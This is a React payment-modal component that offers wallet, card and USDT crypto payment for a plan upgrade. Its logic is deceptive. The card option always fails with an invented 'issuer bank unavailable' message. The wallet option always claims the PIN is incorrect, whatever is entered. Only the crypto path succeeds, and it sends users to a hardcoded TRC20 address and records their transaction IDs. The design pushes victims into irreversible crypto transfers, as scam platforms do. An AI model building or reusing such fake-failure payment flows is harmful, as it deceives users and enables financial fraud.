import React, { useState } from "react";
import styles from "./PaymentModal.module.scss";
import CustomButton from "@/components/ui/custom_button/custom_button";
import CustomInput from "@/components/ui/custom_input/custom_input";
import { Wallet2, CreditCard, QrCode } from "react-bootstrap-icons";
import { calculateWalletBalance } from "@/utils/financials";
import PinInput from "@/components/common/pin_input/pin_input";
import { useAppContext } from "@/context/AppContext";
import { useAuth } from "@/context/AuthContext";
import { supabase } from "@/lib/supabaseClient";
import { Image } from "react-bootstrap";

const PaymentModal = ({ plan, onClose, onSuccess }) => {
    const { assets } = useAppContext();
    const { user } = useAuth();
    const [activeTab, setActiveTab] = useState("wallet");
    const [showTxForm, setShowTxForm] = useState(false);
    const [txId, setTxId] = useState("");
    const [isProcessing, setIsProcessing] = useState(false);
    const [cardError, setCardError] = useState(null);

    // Get Wallet Balance
    const { total } = calculateWalletBalance(assets || []);

    const handlePayment = () => {
        if (activeTab === "crypto" && !showTxForm) {
            setShowTxForm(true);
            return;
        }

        setIsProcessing(true);
        setCardError(null);

        setTimeout(() => {
            setIsProcessing(false);

            if (activeTab === "card") {
                setCardError("Issuer bank unavailable → Temporary downtime at bank side.");
                return;
            }

            if (activeTab === "wallet") {
                setCardError("Security PIN is incorrect");
                return;
            }

            // Crypto final submit
            onSuccess(plan.id);
        }, 2000);
    };

    const handleTxSubmit = async () => {
        if (!txId) {
            setCardError("Please enter a valid Transaction ID");
            return;
        }

        setIsProcessing(true);
        setCardError(null);

        try {
            const { error } = await supabase
                .from('payment_transactions')
                .insert({
                    user_id: user.id,
                    transaction_id: txId
                });

            if (error) throw error;

            // Proceed to success flow (simulated delay)
            handlePayment();
        } catch (error) {
            console.error(error);
            setCardError("Failed to submit transaction. Please try again.");
            setIsProcessing(false);
        }
    };

    const [pin, setPin] = useState("");

    const handlePinChange = (value) => {
        setPin(value);
    };

    const tabs = [
        {
            id: "wallet",
            label: "Wallet",
            icon: <Wallet2 />,
        },
        {
            id: "card",
            label: "Card",
            icon: <CreditCard />,
        },
        {
            id: "crypto",
            label: "Crypto",
            icon: <QrCode />,
        },
    ];

    const handleTabChange = (tabId) => {
        setActiveTab(tabId);
        setCardError(null);
        setShowTxForm(false);
    };

    const walletAddress = "TKch9X3yJaYhxxLiLCCAWuJv8YbbqVk7SN"

    return (
        <div className={styles.modalOverlay}>
            <div className={styles.modalContent}>
                <div className={styles.header}>
                    <h2>{showTxForm ? "Verify Payment" : `Upgrade to ${plan.name}`}</h2>
                    {!showTxForm && <p className={styles.price}>Total: ${plan.price}</p>}
                    <button className={styles.closeBtn} onClick={onClose}>&times;</button>
                </div>

                {!showTxForm && (
                    <div className={styles.tabs}>
                        {tabs.map((tab) => (
                            <button
                                key={tab.id}
                                className={`${styles.tab} ${activeTab === tab.id ? styles.active : ""}`}
                                onClick={() => handleTabChange(tab.id)}
                            >
                                {tab.icon} {tab.label}
                            </button>
                        ))}
                    </div>
                )}

                <div className={styles.body}>
                    {showTxForm ? (
                        <div className={styles.cardForm}>
                            <div style={{ textAlign: 'center', marginBottom: '20px' }}>
                                <p style={{ color: '#aaa', fontSize: '0.9rem', marginBottom: '8px' }}>
                                    Please enter your Transaction ID (TXID) below.
                                </p>
                                <div style={{ background: 'rgba(38, 161, 123, 0.1)', padding: '12px', borderRadius: '8px', border: '1px solid rgba(38, 161, 123, 0.3)' }}>
                                    <p style={{ color: '#26A17B', fontSize: '0.85rem', margin: 0 }}>
                                        ⏱️ Payment verification typically takes <strong>10–30 minutes</strong>.
                                    </p>
                                </div>
                            </div>

                            {cardError && (
                                <div className={styles.errorMessage}>
                                    {cardError}
                                </div>
                            )}

                            <CustomInput
                                label="Transaction ID (TXID)"
                                placeholder="e.g. 7f8e9d..."
                                value={txId}
                                onChange={(e) => setTxId(e.target.value)}
                            />

                            <CustomButton fullWidth onClick={handleTxSubmit} disabled={isProcessing || !txId}>
                                {isProcessing ? "Verifying..." : "Submit Transaction"}
                            </CustomButton>
                        </div>
                    ) : (
                        <>
                            {activeTab === "wallet" && (
                                <div className={styles.walletTab}>

                                    {cardError && (
                                        <div className={styles.errorMessage}>
                                            {cardError}
                                        </div>
                                    )}
                                    <br />

                                    <p className={styles.label}>Available Balance</p>
                                    <h3 className={styles.balance}>${total.toLocaleString()}</h3>
                                    {total < plan.price && (
                                        <p className={styles.error}>Insufficient fund. Please deposit or use another method.</p>
                                    )}

                                    <p className={styles.label} style={{ marginTop: '16px' }}>Security PIN</p>
                                    <PinInput length={6} onChange={handlePinChange} />

                                    <br />

                                    <CustomButton
                                        fullWidth
                                        onClick={handlePayment}
                                        disabled={total < plan.price || isProcessing || pin.length < 6}
                                    >
                                        {isProcessing ? "Processing..." : "Pay from Wallet"}
                                    </CustomButton>
                                </div>
                            )}

                            {activeTab === "card" && (
                                <div className={styles.cardForm}>
                                    {cardError && (
                                        <div className={styles.errorMessage}>
                                            {cardError}
                                        </div>
                                    )}
                                    <CustomInput label="Card Number" placeholder="0000 0000 0000 0000" />
                                    <div className={styles.row}>
                                        <CustomInput label="Expiry" placeholder="MM/YY" />
                                        <CustomInput label="CVC" placeholder="123" />
                                    </div>
                                    <CustomButton fullWidth onClick={handlePayment} disabled={isProcessing}>
                                        {isProcessing ? "Processing..." : "Pay with Card"}
                                    </CustomButton>
                                </div>
                            )}
                        </>
                    )}

                    {activeTab === "crypto" && !showTxForm && (
                        <div className={styles.cryptoTab}>
                            <div className={styles.qrPlaceholder}>
                                <Image src="/images/qr.jpg" alt="QR Code" width={200} height={200} />
                            </div>
                            <div className={styles.addressBox}>
                                <label>Send exact <span style={{ color: '#26A17B' }}>USDT (TRC20)</span> amount to:</label>
                                <div className={styles.address}>
                                    {walletAddress}
                                </div>
                                <span className={styles.copyHint}>Click to copy address</span>
                            </div>
                            <CustomButton fullWidth onClick={handlePayment} disabled={isProcessing}>
                                {isProcessing ? "Checking..." : "I have made the transfer"}
                            </CustomButton>

                            <div style={{ marginTop: '12px', textAlign: 'center' }}>
                                <a
                                    href="/how-to-pay"
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    style={{ color: '#888', fontSize: '0.9rem', textDecoration: 'none' }}
                                    onMouseOver={(e) => e.target.style.color = '#F7931A'}
                                    onMouseOut={(e) => e.target.style.color = '#888'}
                                >
                                    Don't know how to pay? <span style={{ textDecoration: 'underline' }}>Click here</span>
                                </a>
                            </div>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
};

export default PaymentModal;
